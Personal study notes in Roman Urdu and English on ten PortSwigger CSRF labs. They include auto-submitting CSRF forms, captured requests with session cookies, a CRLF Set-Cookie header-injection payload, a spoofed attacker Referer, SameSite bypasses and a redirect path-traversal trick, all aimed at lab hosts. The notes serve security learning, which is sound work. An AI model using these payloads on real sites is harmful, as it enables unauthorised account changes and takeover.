CSRF ---> 
What is session handling or management ?

User agar bank app use krna chata to wo sab se pehle apna aap ko login kre ga username and password se and in return app us ko cookie de ge browser me store ho jaye ge, cookie user ko identify krta. To cookies phir identify krta user ke agli requests ko use cookie ke base par, yani us ke baad ham jo krte transactions yeh kaam wo request ja rhy us me wo he cookie ja rhy hote, to agar me koi request kru ga backend me bohot sare cookies ho ge us ke paas jo or logo ke pa bhe ho ge jab me kuch kru ga request wo mere cookie dekhe ga and response de ga agar match krte hoye

  
CSRF vuln -> hote tab hai jab user logged in ho yani wo apna sab username and password de chuka ho cookie us ke paas ho, to csrf attack aik attack hai where attacker causes the victim user to carry out an action unintentionally while that user is authenticated

To ab scene kya attacker user ko link bhejta, us time user logged in hota bank me, jis bank me wo logged in hai wo hai bank.com, jab attacker link send kre ga to https://bank.com/email/change/?email=attacker@gmail.ca

So when user clicks it https://bank.com/email/change/?email=attacker@gmail.ca
to wo bank.com ke domain dekhe ga and browser cookie jar me dekhe ga ke kya mere pas koi cookie hai is domain ke lie bank.com ke lie, to cookie jar kahe ga ke hai yes me logged in hu is domain pr  

Conditions for the attack ->
1 ) Attacker has to send email to the user 
2 ) User should click
3 ) User have to be logged in this case

How it is vulnerable -> It should satisfy 3 conditions for vulnerability now ->
1) Relevant action -> notes
2) Cookie-based session handling -> notes
3) No unpredictable(predictable parameter ho ga to csrf possible ha) request parameters -> notes


➡️ Haan! Teeno cheezein mil kar CSRF ko possible banati hain ------->>>>
Agar aapka action hi sensitive nahi, to koi farq nahi padta.
Agar cookie-based session nahi, to attacker ko unauthorized access nahi milega.
Agar unpredictable token hai, to forged request fail ho jayegi.
👉 Agar in mein se ek bhi secure hai, to CSRF attack successful nahi hoga.


-> Last 2017 ke owsap top 10 me csrf top 10 se nikal gai, and 2013 me 8th par teh and 2019 me 5th par, lakin aaj bhe milte hain ese baat nhi ke nhi milte.

✅ Nahi!
Cookie jar browser (client) me hota hai, server me nahi.

👉 Browser automatically cookies save karta hai aur har relevant request me bhejta hai.
👉 Server sirf cookie ka value verify karta hai (jaise session ID).



Lab 1-> CSRF - Lab #1 CSRF vulnerability with no defenses  

-> Vuln parameter -> email change functionality

Goal -> Exploit the CSRF vuln and change the email address 

creds -> given -> Wiener : peter


Yar un ke jo server tha waha body me code likho and chal jaye ga and change ho jaye ga 
email code me ne likha hua notes me, so kis trha kaam hua code likh ke bhe kia python ka server chalaya. Baki sara waha likha hua wo parh lena Lab --------> 1 se onwards

Code neeche de rha 

<html>
  <body>
    <h1>Hello World!</h1>
    <iframe style="display:none" name="csrf_iframe">
    </iframe>

    <form action="https://0ab100570382483483d305a300ad0057.web-security-academy.net/my-account/change-email" method="POST" id="csrf_form">
      <input type="hidden" name="email" value="sameer249_1754@gmail.com">
      <input type="submit" value="submit request">
    </form>
    <script>
      document.forms[0].submit();
// Necche wale se bhe kaam kar jai ga and forms se bhe 
//   document.getElementById('csrf_form').submit();

    </script>
  </body>
</html>



LAB 2 --------->

Lab #2 CSRF where token validation depends on request method

Vuln parameter -> email change functionality

Goal -> exploit CSRF to change email address 

Halka phulka defence ha is me 

Creds -> wiener: peter

Burp pro pe wo kaam krwa rhy us ke cheze me nhi likh rha, me manually kr rha

Analysis -> A relevent action 
-> Cookie based session handling: session cookie
-> No unpredictable request parameters



email=sameer%40gmail.com&csrf=KP9F6AZkVZ0U8tCSDDTW6QmJotMH2vvi
yeh aya burp siute pe jab kia ab lag to rhake csrf token nazar a rha to yeh csrf vuln nhi ho ge lakin context dekhna zaruri hai ke kis context me csrf token hona chaye

Testing CSRF TOKENS -> 
1) Change the request method from post to get
When u want something from website u do get and when u give something to app then u use post, so that is why we use csrf for post method, csrf get me itna matter nhi krta, cz data a rha hota and csrf atttack se ham force nhi kr sakte app ko wo data send kre 

1) relevant action: change a users email
2) cookie based session handling
3) No unpredictable request parameters: Request method can be changed to GET which does not require csrf token

yeh aya jo neeche likha burp me ------>>>

POST /my-account/change-email HTTP/2
Host: 0a3e001304bb1a5280d5e9ed00010016.web-security-academy.net
Cookie: session=70jHWHt993omafFsBKq4nhD0TxvPLUOP
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Origin: https://0a3e001304bb1a5280d5e9ed00010016.web-security-academy.net
Referer: https://0a3e001304bb1a5280d5e9ed00010016.web-security-academy.net/my-account?id=wiener
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Content-Type: application/x-www-form-urlencoded
Content-Length: 62

email=sameer%40gmail.com&csrf=Tk8uKddzTa6y6Av11UGfXSJf7WSuEYpf


uper agar me csrf token hata bhe du and post se kru wo kahe ga mujhe csrf token chaye, lakin jab neeche get se kru ga and csrf hata du ga to wo kuch nhi kahe ga, lakin wese secure banane ke lie get se hona he nhi chaye server side agar hota to get pe bhe csrf mangni chaye, baki jo hota wo me ne bata dia



request method change kia to yeh bana -> csrf hata dena and email change kr ke run krna and follow redirection kr dena and check kr lena

GET /my-account/change-email?email=sameer%40gmail.com&csrf=Tk8uKddzTa6y6Av11UGfXSJf7WSuEYpf HTTP/2
Host: 0a3e001304bb1a5280d5e9ed00010016.web-security-academy.net
Cookie: session=70jHWHt993omafFsBKq4nhD0TxvPLUOP
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Origin: https://0a3e001304bb1a5280d5e9ed00010016.web-security-academy.net
Referer: https://0a3e001304bb1a5280d5e9ed00010016.web-security-academy.net/my-account?id=wiener
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers


// Agar burp pro ka use krein to repeater me he ja ke double click kr ke engagement tools and us me generate csrf poc. waha ja ke right top pe options a rha ho ga and waha include auto submit kr dena and regenrate, burp me jo ho rha wo yeh sab jo uper bataya ke kya krna us se hamein csrf script mile ge jise right click kr ke wo auto submit wale js pe click kr ke javascript a jaye ge jo auto kr de ge ab karna kya is sab ko copy kr lena, copy kr ke likhna portswigger pe server par or waha se view exploit kr dena

Ab jo lab 2 ko khud se script kr rhy us me thore se changing ha neeche kr rha, lakin chalaun ga use file se lab 1 ke script ko comment kr ke



<html>
  <body>
    <h1>Hello World!</h1>
    <iframe style="display:none" name="csrf_iframe">
    </iframe> // iframe kar rhy ke jab wo is par click rk ke change kre ga wo us page pe a jai ga jaha email change ho rhy us ko pata lag jaye ga lakin ham chate pata na lage to use kr rhy, wese yeh code hona ese he hai lakin wo phir bhe redirect kr rha idk

    <form action="https://0add00960413100e809003400005009a.web-security-academy.net/my-account/change-email" method="GET" id="csrf_form">
      <input type="hidden" name="email" value="sameer249_17@gmail.com">
      <input type="submit" value="submit request">
    </form>
    <script>
      document.forms[0].submit();
// Necche wale se bhe kaam kar jai ga and forms se bhe 
//   document.getElementById('csrf_form').submit();

    </script>
  </body>
</html>

-> Baki is ke baad me ne file me dal ke python wala server run kr ke is ko bhe run kis acha is ko firefox ke browser me run kr rha to ho rha chrome me nhi





Lab -> 3

Lab #3 CSRF where token validation depends on token being present 

Vuln -> email change functionality
creds: wiener:peter

Analysis -> Wo 3 batein yaad kro jo csrf krwate 
1) Cange the request method from POST to GET

Is lab me relevant action ho rha 
Cookie based session handling bhe hai(cookie nazar a rhy burp me)
Lakin csrf hai to unpredictable ho gya yeh, lakin hamein to no unpredictable chaye tha, yaha to csrf token a gya jo unpredictable ha ham use predict nhi kr sakte 

(1) So in this case ham request change kr dein ge POST TO GET, so get me wo check nhi krta, pehle POST method se check krte ke jab POST me csrf token remove krte to wo yeh to nhi kehta parameter missing, lakin wese kal lab 2 me keh rha tha is case me remove kr rhy missing nhi keh rha, jab galt likhte koi word daal dete tab kehta invalid csrf token, to matlab csrf token is not mandatory.

is trha tha 

POST /my-account/change-email HTTP/2
Host: 0a7f00220453d02d813925dd00d6000e.web-security-academy.net
Cookie: session=gMO5g2OkcET3y4SOIHpp9CQigbu6JoxO
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
Origin: https://0a7f00220453d02d813925dd00d6000e.web-security-academy.net
Referer: https://0a7f00220453d02d813925dd00d6000e.web-security-academy.net/my-account?id=wiener
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

email=sameer%40gmail.com&csrf=T9vgMFE6J6d2j2uksmD2AiAthutOfVqv

csrf token remove kr du to 

HTTP/2 302 Found
Location: /my-account?id=wiener
X-Frame-Options: SAMEORIGIN
Content-Length: 0

yeh ai ga and agar remove na kru kuch galat enter kr du to

HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 20

"Invalid CSRF token"

yeh ai ga, cz csrf ke hone na hone se frk nhi parh rha token ke bagir script bhej dein chal jaye ge halan ke token nazar a rha lakin us ke implementation sahi nhi hue, lab 4 me token bhejna zaruri hai jo neeche ke banda dar jaye ke yr shit csrf kese possible ho ga lakin wo tied nhi tha to koi bhe csrf bhej do is lie us me script me csrf likha hua 





Lab #4 ------>>>
CSRF where token is not tied to user session 

Vuln parameter -> email change functionality

Analysis -> 3 points yaad kro

1) Relevant action ho rha, cz email change ho rha 
2) Session handling bhe ho rhy cookies ha
3) No unpredictable request parameter hona chaye, is ke implementation neeche ha pta chal jaye ga 

TESTING ->

1))) Remove the csrf token and sees if application accept request -> No is case me nhi ho rha means their is unpredictable token


2))) Change the request method from POST TO GET -> Ab yeh karna pare ga, lakin issue ho gya ab yeh bhe nhi ho rha jab me change kr rha post to get to yeh a rha. -------->>>>>

HTTP/2 405 Method Not Allowed
Allow: POST
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 20

"Method Not Allowed"


-> Lakin agar yeh jo jata get kaam kr jata phir agla step hota ke ham dekhte kya get ke sath csrf kaam kr rha, cz most applications get ke sath csrf ko kaam nhi krte, phir ham woh check krte and agar na accept krta get ke sath csrf to bale bale



3)) Ab 1 and 2 to kaam nhi kr rhy ab aik or tareka ham check krein ge ke kya csrf tied hai user session se ?? To ham ne check krna kya csrf token us session ke sath jo aik or number likha us ke sath tied ha ke nhi? Is ke lie hamein aik or account chaye ho ga jo unho ne dia hua ha    carlos:montoya

To private window firefox me jao waha login kro carlos ko samjho yeh attacker ha ab is ka csrf inspect kr ke copy kia 

DvBTNwqfiwpgUnizq3mSnbJWow51zRxC

ab check kro wiener ke account me ke agar yeh csrf token laga dein us ke email ke sath to kaam kr jaye ga ??? To me ne likha or kaam kar rha means csrf token koi sa bhe kaam kar jaye ga tied nhi hai it means, to it is vuln to csrf, ab me manually krne laga script lab 4 ke likhe hoye dusre file me, burp pro se bs script mil rhy bs, jo gpt se mil sakte and rana bhe karwa rhy, krna portswigger ke server me he ha

To ab krna kya hai?
Ab attacker apni website ka he csrf token script me dale ga and user jab click rke ga to cz csrf token tied nhi hai session se wo csrf accept kr le ga server


-> Lakin csrf token har bare change hota jab reload krte page pehle baat and dusre baat aik csrf token aik baar he use ho ga jab me script me csrf token likh ke victim ko bheju ga to wo dabai ga to aik dafa email change ho ge phir krne ke lie new csrf token bhejna pare ga 

-> Ab me check krne laga python server se, and ho gya




LAB -> 5 --------->>>>>>>

Lab #5 CSRF where token is tied to non-session cookie 


Vuln -> Email change functionality

Goal -> Exploit csrf to change email address

Cred -> wiener:peter, carlos:montoya

Analysis =>
3 points yaad kro
1)Relevant change -> Satisfied
2)Cookie session handling -> Satisfied
3)No unpredictable parameter

For number 3 point there is further to see ->

1) Removes the csrf and see if app still accepts request?
2) Change the request from POST TO GET
3) See if csrf token is tied to user session


Esa show ho rha ->

POST /my-account/change-email HTTP/2
Host: 0a7d00b804afeb63804a033e00c9003b.web-security-academy.net
Cookie: session=cYIVGgTTpTjxwmzFQqQWkVz5YfHi4VfN; csrfKey=4A3ejFZnCl6pMcQ7n5u633hldi2vLGuO
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Origin: https://0a7d00b804afeb63804a033e00c9003b.web-security-academy.net
Referer: https://0a7d00b804afeb63804a033e00c9003b.web-security-academy.net/my-account?id=wiener
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

email=sameer%40gmail.com&csrf=HlHbvB18oNSh0CB9X1t0Tg8FYIQQExEj

-> NEECHE DEKHO AB

session=cYIVGgTTpTjxwmzFQqQWkVz5YfHi4VfN; csrfKey=4A3ejFZnCl6pMcQ7n5u633hldi2vLGuO

email=sameer%40gmail.com&csrf=HlHbvB18oNSh0CB9X1t0Tg8FYIQQExEj


uper dekho aik csrf KEY hai, jo ke tied hai csrf parameter se and check kre ga backend me ke yeh jo neeche wala csrf hai jo request me a rha wo kya equal hai csrfkey ke ???



TESTING -> Is time hamare paas csrf token and csrf key cookie hai

1) Check if csrf token is tied to csrf cookie ?
  - Submit an invalid csrf token
  - Submit a valid CSRF token from another user(kis dusre user ka csrf token pakro and wo bhejo csrf key wo he rhy ge jo hamare hai, to agar tied hoye dono to accept nhi ho ga lakin aagr na hoye tied to ho jaye ga)

2) Submit valid csrf token and cookie from another user -> Yeh he is lab me kia key and token dono dusre user ke dale chal gya, jab invalid csrf kia tab bhe error aya and jab sirf valid csrf token dia dusre bande ka tab bhe nhi chala, dono kia to kaam bana, so is case ka matlab hai ke key and token session ke sath linked nhi the to ham ne kisi or user ka bhej dia dono cheze and session to khud jata to kaam ban gya is lie us ko bhe linked krna agli baar, phir csrf key, token dono churana pare ga hacker ko agar us ko access chaye 

Yaha se krna ---->
In order to perform this vuln we need. perform two things 
1) Inject a csrfkey cookie in the user's session, so this is technically http header injection 
2) U need to send CSRF attack to the victim with a known csrf token parameter

Yeh dono uper jo kaam likhe aik sath krne hain


-> http header injection find krna pare ga http header kyun kehte cz vuln occurs when http headers are dynamically generated based on user input, so csrfkey ko ham set krein ge attakcer ke by http header injection, 2nd part ez ha krte rhy hain, search me ja ke hat likha us ke bad aik or cookie ban jaye ge lastsearch inspect me ja ke storage me dekhna, ab http header injection krne lage yani csrfkey likhe ge attacker ke us hat wale input jaga me me dekhata waha krne http header injection 


Yeh dekho neeche ab ->

GET /?search=hat%0d%0aSet-Cookie:%20csrfKey=4V5iG5T2Pde5QKnkyvbiT54uLyJa0qUT HTTP/2
Host: 0a8a004e04f9aacb8180b30800b400b9.web-security-academy.net
Cookie: session=WbfLl575rznX1csRaycrb7Sva7xEHW5o; csrfKey=lvhfXqWQtRgCh3JGxEUtLEvBpbFbMCJd
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://0a8a004e04f9aacb8180b30800b400b9.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers



%0d%0aSet-Cookie:%20csrfKey=4V5iG5T2Pde5QKnkyvbiT54uLyJa0qUT 
-> Yeh me ne likha hat tak to input dia wo to likha a rha tha wese bhe

and response jo aya wo dekho, complete nhi likha lakni cookie attacker wale yani carlos ke a gaye -------->>>>>

HTTP/2 200 OK
Set-Cookie: LastSearchTerm=hat
Set-Cookie: csrfKey=4V5iG5T2Pde5QKnkyvbiT54uLyJa0qUT; Secure; HttpOnly
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3473

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
        <title>CSRF where token is tied to non-session cookie</title>
    </head>
    <body>


---->>> Ab dekho yeh aik part satisfy ho gya yeh wala --->>> 1) Inject a csrfkey cookie in the user's session, so this is technically http header injection 

ab bare 2nd part ke jo ham karte a rhy koi frk nhi apna csrf token de dena and key to ham ne set kr de hoye










LAB -> 6 -> Lab #6 CSRF where token is duplicated in cookie 

Goal -> Change email address by exploiting 

Analysis:  3 conditions hain wo he, and 3 he hain is me bhe

Testing csrf tokens -> Tab karna jab sirf token hota ->   

1) remove the csrf token and see if app accepts request?
2) Change the request from method post to get
3) See if a csrf token is tied to user session

But now if the case there is a csrf key and token then the testing is bit different

1) Check if csrf token is ties to csrf cookie?
-Submit an invalid csrf token
-Submit a valid csrf token from another user

2) Submit a valid csrf token and cookie from another user


But in this lab both csrf cookie and token are same, while jo uper lab ke us me csrf key adn token diff tha 
x123 and x1234 something and x123 and x123 he ha

In order to expolit thus vulnerability, we need to perform 2 things:
1) Inject a csrfkey cookie in the user's session (http header injection)
2) Send a csrf attack to the victim with a known csrf token

and koi valid token and cookie nhi zaruri uper wale sawal ke trha, bs same hona chaye like test and test is trha ka bhe chale ga. 

And http header injection jab kr rhy hote to us ko bhe validate nhi hona chaye, yani validation agar lage hoe to nhi hone de ga agar us ne allow kia dynamic generation of http header to ho ga


-> To hat likha input me yaha ai uper wale sawwal krha phir header injection ke

%0d%0aSet-Cookie:%20csrf=test --->>> yeh kia




GET /?search=hat%0d%0aSet-Cookie:%20csrf=test HTTP/2
Host: 0a81003b0448b985801bbc6000d400c7.web-security-academy.net
Cookie: session=WkOx0FVFJLFM4sGChi1eSf0sV1luhL3m; csrf=olvd3YRnL1nexm5srig2h9fXwEUe91uR
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://0a81003b0448b985801bbc6000d400c7.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers


Chal nhi rha yeh code is ka jo html code ha wo likh dia hua me ne dusre file me and is ke info on notes ---->


Lab #7 CSRF where Referer validation depends on header being present

Vuln -> Email change functionality(email ka jo parameter hai)

Goal -> Exploit CSRF to change email address

Analysis -> 3 points yaad rakhna
1) Relevant action -> Satisfied
2) Cookie based session handling -> session cookie
3) No unpredictable request parameters -> no csrf token this time so it satisfies all 3 conditions, is case me sirf aik he parameter ha wo email ka ha and wo predictable hai 

POST /my-account/change-email HTTP/2
Host: 0a5b00ac037d173e81df251b00d300a1.web-security-academy.net
Cookie: session=2Jn6RYbAFHCxQQfEsdgaG3rko8ngGHW3
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
Origin: https://0a5b00ac037d173e81df251b00d300a1.web-security-academy.net
Referer: https://0a5b00ac037d173e81df251b00d300a1.web-security-academy.net/my-account?id=wiener
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

email=sameer%40gmail.com


Testing for referer header ->

1) Remove the referer headers -> Somethimes apps kya krte dekhte referer header ko agar ha to validate kr dete hamare referer ko lakin agar nhi hota to check nhi krte to ab ham remove kr ke dekhein ge 

is ko hata dena ---->>>>

Referer: https://0aa6006403383aaa8645be3c0017000a.web-security-academy.net/my-account?id=wiener

and reponse bhe theek a rha follw redirection kr ke, so referer ko unho ne sahi se implement nhi kia

code jo ha likh dia dusre file me waha meta use krne ke waja yeh ha ke 

➡️ Ye browser ko instruction deta hai:

“Jab bhi koi link, form ya request is page se jaaye → uska Referer header bhejna ya nahi?”

✅ content="never" ka matlab kya hai?
never = Kabhi Referer mat bhejna!

Matlab: Tumhare form se request jaayegi:

Victim ki cookies jayengi ✅

Referer header bilkul nahi jaayega ❌

⚡️ Yahan is lab mein iski zaroorat kyun hai?
Is lab ka flaw hai: Server Referer pe depend karta hai.

Agar Referer gayab ho jaaye, toh server request allow kar deta hai!

Tum attacker ho:

Tum chaahte ho victim ka browser Referer na bheje.

Browser by default Referer bhej deta hai → tumhara exploit fail ho jaata.

Isliye tum meta se browser ko force kar dete ho: “Referer bilkul na bhejna!”

✅ Result:

Victim ki request legit lagegi.

Referer missing → server ka flawed check pass → CSRF successful.

🎯 Ek line mein punchline:
“<meta name="referrer" content="never"> attacker ke page pe lagate hain taake victim ka browser Referer header na bheje — server confuse ho jaaye aur CSRF pass ho jaaye!”

✅ Bas! Isliye meta tag use hota hai is lab mein.




// Lab #8 CSRF with broken Referer validation 



Vuln = email change

Goal = exploit csrf vuln for email change

Analysis = 3 conditions 
is baar bhe csrf token nhi to all 3 satisfy kr rhy, 3rd condition ko aage check nhi krna pare ga

Testing = 
1) Remove the referer header
is baa referer header remove krne se kaam nhi ban rha so ab next step 

2) Check which portion of the referer header is the application validating
Ab is me scene yeh ho rha 
https://aacdse.web-security-academy.net
is trha tha hamara origin and ham ham ne referer ko dekha wo bhe same ese he hai like
https://aacdse.web-security-academy.net/my-account
ke yaha se aya abhi url ab ham ne dekhna ab vuln is referer me yeh hai ke yeh sahi se validate nhi hua, yeh bs yeh dekhta ke kya wo referer a rha andar ke nhi like
https://aacdse.web-security-academy.net/my-account yeh ana chaye ab is se peeche me attacker.com likh du to csrf ho jaye ga cz wo bs yeh dekh rha ke kya referer majood ha https://aacdse.web-security-academy.net/my-account yeh wala?? bs agar hua to done ho jaye ga kaam chaye ab me is ke sath attacker.com likh du 
yani ez alfaaz me bataun to apps just yeh dekhte ke domain of app is contained in the referer header


so yeh tha total 

GET /my-account?id=wiener HTTP/2
Host: 0ad500b4044f6e6180b40d1300d600de.web-security-academy.net
Cookie: session=mBmd9p2MX0hlEgynAx1ETuuiIKQEYNR7
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Origin: https://0ad500b4044f6e6180b40d1300d600de.web-security-academy.net
Referer: https://0ad500b4044f6e6180b40d1300d600de.web-security-academy.net/my-account/change-email
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers


--->> change email referer me jo laga wo hata dena zayda behtr samjh ai ga
and dekho me ne kya kia 

Origin: https://0ad500b4044f6e6180b40d1300d600de.web-security-academy.net
Referer: https://0ad500b4044f6e6180b40d1300d600de.web-security-academy.net

-->> To ab dekho same domains hain ab security jo lage us ke yeh lage ke tum ne dekhna kya tumhare wale domain origin wale referer me ha ?? Ho ge to wo validate kr de ga, lakin me ne apni bhe ghusaai ho ge


POST /my-account/change-email HTTP/2
Host: 0ad500b4044f6e6180b40d1300d600de.web-security-academy.net
Cookie: session=mBmd9p2MX0hlEgynAx1ETuuiIKQEYNR7
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
Origin: https://0ad500b4044f6e6180b40d1300d600de.web-security-academy.net
Referer: https://hacker-domain.com/?0ad500b4044f6e6180b40d1300d600de.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

email=sameer%40gmail.com



Referer: https://hacker-domain.com/?0ad500b4044f6e6180b40d1300d600de.web-security-academy.net
yeh dekho ab is trha kia



<!-- Lab -> 9
Lab: SameSite Lax bypass via method override -->



POST /my-account/change-email HTTP/2
Host: 0a620067043c10228122a2b400680066.web-security-academy.net
Cookie: session=v3Qdt5JsMfqISZsXymWxKwkAiqkJwEG5
Content-Length: 26
Cache-Control: max-age=0
Sec-Ch-Ua: "Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Origin: https://0a620067043c10228122a2b400680066.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a620067043c10228122a2b400680066.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Priority: u=0, i

email=sameer12%40gmail.com

Pehle is trha tha jis trha uper phir me ne post ko get me change kia request ko, jo neeche show ho rha wo hua then
&_method=POST yeh laga dia aage ab ho kya rha samestrict = lax hai yeh so hota yeh lax me get request ke sath cookies jate lakin post ke sath nhi jate, to ham ne jab Overall req ko get kia nhi chal rha tha, phir ham ne &_method=POST yeh jo kia to yeh priority le gya browser ko laga acha post use ho rha to wo cookie send kr de ga hamare get request ke sath, to ham jo cross site kr rhy yeh tareka lax se krne ka

✅ Lax simple words me:
Cross-site GET requests → ✅ Cookies jayengi

Cross-site POST requests → ❌ Cookies nahi jayengi


GET /my-account/change-email?email=sameer12%40gmail.com&_method=POST HTTP/2
Host: 0a620067043c10228122a2b400680066.web-security-academy.net
Cookie: session=v3Qdt5JsMfqISZsXymWxKwkAiqkJwEG5
Cache-Control: max-age=0
Sec-Ch-Ua: "Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Origin: https://0a620067043c10228122a2b400680066.web-security-academy.net
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a620067043c10228122a2b400680066.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Priority: u=0, i







<!-- Lab -> 10 -->
<!-- SameSite Strict bypass via client-side redirect -->

Ab is case me scene yeh ha ke same site strict ha ham cookie me ja ke dekh bhe sakte inspect kr ke 

-> Ab ham is ko directly nhi solve kr skte like previous labs where samesite lax yah none the, hamein ab jo https jo schema and domain ha example.com ha us ko same krna pare ga, like jo request ho wo same site se ai cross origin se na ho so same strict kaam nhi kare ge yani https and websecurity academy se he request bhejne pare ge

-> ISE WEBSITE SE REQUEST JANE CHAYE AB, itna samjho bs  

-> IS website par koi open redirect dhoondna pare ga mujhe ab, yani /login hai to me /login?next=https://evil.com pe chala jaun, use request se to cookie chale jaye ge


to yeh aaya tha -> me thora cut kr rha length kafe ban jaye ge page par


GET /post/comment/confirmation?postId=1 HTTP/2
Host: 0a8d003904d2dbe181b7118200200071.web-security-academy.net
Cookie: session=3anipoFoz4y5kplVDRdmne8j8EeZAN94

-> ab postId=1  ko postId = hello kr lo waha redirect dekho krta ke nhi to rigth side pe dekha to is trha aya

<div class="is-linkback">
    <a href="/post/hllo">Back to blog</a>
</div>

Ab ham url likhe ge -->>

url is trha kia ke burp me jab request bheje follow redirection kia to post se get me convert ho gaye khud and yeh aya GET /post/comment/confirmation?postId=1 aage ham ne apna likh lia /../../my-account/change-email?email=hello1@gmail.com&submit=1 -->> is pure page ka url copy kr lia and script ke andar likh dia and chala gia to ho gya kaam

